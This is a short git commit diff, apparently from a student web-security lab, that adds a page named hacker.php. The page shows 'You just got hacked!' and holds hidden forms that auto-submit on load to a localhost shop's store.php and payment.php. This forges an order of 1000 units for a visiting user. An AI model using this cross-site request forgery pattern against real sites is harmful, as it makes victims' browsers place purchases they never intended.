a556600f22a51a674550a95e0cb0b66f271cc7b0
HannaLindwall <hanna.lindwall93@gmail.com>
2017-10-09 15:25:20 +0200

    body

--- hacker.php
+++ hacker.php
@@ -1,5 +1,17 @@
 <html>
-
-  <h1 align="center" > You just got hacked!</h1>
-
+  <body>
+    <h1 align="center" > You just got hacked!</h1>
+    <!-- create form which increases item with id=1 by 1000 units -->
+    <form id=add style="display:none" method="post" action="https://localhost/store.php">
+      <input type="hidden" name="itemIds" value=1000>
+      <input type="hidden" name="id" value=1>
+    </form>
+    <!--submits the form to store.php -->
+    <script> document.getElementById("add").submit() </script>
+    <!-- go to payment.php -->
+    <form id="buy" style="display:none" method="post" action="https://localhost/payment.php">
+    </form>
+    <!--submits the form to payment.php -->
+    <script> document.getElementById("buy").submit() </script>
+  </body>
 </html>
